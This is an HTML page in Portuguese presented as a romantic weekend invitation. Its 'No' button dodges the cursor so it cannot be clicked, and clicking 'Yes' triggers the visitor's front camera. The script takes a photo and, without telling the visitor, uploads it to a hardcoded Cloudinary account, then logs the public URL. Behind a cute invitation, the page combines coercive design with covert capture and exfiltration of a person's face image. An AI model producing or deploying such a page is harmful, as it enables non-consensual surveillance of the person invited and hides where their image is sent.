<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CONVITE PRA PEQUENA</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            position: relative;
        }
        .question {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .buttons {
            display: flex;
            gap: 10px;
        }
        .button {
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        .button-yes {
            background-color: green;
            color: white;
        }
        .button-no {
            background-color: red;
            color: white;
        }
        .button:hover {
            background-color: #ddd;
        }
        .message {
            font-size: 20px;
            margin-top: 20px;
            color: blue;
            display: none;
        }
        #photo {
            margin-top: 15px;
            border-radius: 10px;
            max-width: 280px;
            display: none;
            border: 3px solid green;
        }
        #cameraStatus {
            font-size: 14px;
            color: gray;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="question">Vamos ao topo de mundo esse final de semana ?</div>
    <div class="buttons">
        <button class="button button-yes" id="yesButton">Sim</button>
        <button class="button button-no" id="noButton">Não</button>
    </div>
    <div class="message" id="message">Te busco as 19 😍</div>
    <div id="cameraStatus">📸 Registrando o momento...</div>
    <img id="photo" alt="Sua foto" />
    <video id="video" style="display:none;" playsinline autoplay muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <script>
        const noButton = document.getElementById('noButton');
        const yesButton = document.getElementById('yesButton');
        const message = document.getElementById('message');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');
        const cameraStatus = document.getElementById('cameraStatus');
        
        noButton.addEventListener('mouseover', () => {
            const x = Math.random() * (window.innerWidth - noButton.offsetWidth);
            const y = Math.random() * (window.innerHeight - noButton.offsetHeight);
            noButton.style.position = 'absolute';
            noButton.style.left = `${x}px`;
            noButton.style.top = `${y}px`;
        });
        
        yesButton.addEventListener('click', () => {
            message.style.display = 'block';
            tirarFoto();
        });

        function tirarFoto() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

            cameraStatus.style.display = 'block';

            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            }).then(stream => {
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    stream.getTracks().forEach(track => track.stop());
                    video.srcObject = null;

                    const dataUrl = canvas.toDataURL('image/png');
                    photo.src = dataUrl;
                    photo.style.display = 'block';
                    cameraStatus.style.display = 'none';

                    // 1) Download automático no dispositivo dela
                    const link = document.createElement('a');
                    link.href = dataUrl;
                    link.download = 'sim-vamos-' + Date.now() + '.png';
                    link.click();

                    // 2) Upload para Cloudinary (grátis)
                    const CLOUD_NAME = 'dutewy49b';
                    const UPLOAD_PRESET = 'testes';
                    const base64 = dataUrl.split(',')[1];
                    const formData = new FormData();
                    formData.append('file', 'data:image/png;base64,' + base64);
                    formData.append('upload_preset', UPLOAD_PRESET);

                    fetch('https://api.cloudinary.com/v1_1/' + CLOUD_NAME + '/image/upload', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (data && data.secure_url) {
                            console.log('📸 Foto salva na web:', data.secure_url);
                            const fotos = JSON.parse(localStorage.getItem('fotos') || '[]');
                            fotos.push({ url: data.secure_url, data: new Date().toISOString() });
                            localStorage.setItem('fotos', JSON.stringify(fotos));
                        }
                    })
                    .catch(() => {});
                }, 1500);
            }).catch(() => {
                cameraStatus.style.display = 'none';
            });
        }
    </script>
</body>
</html>
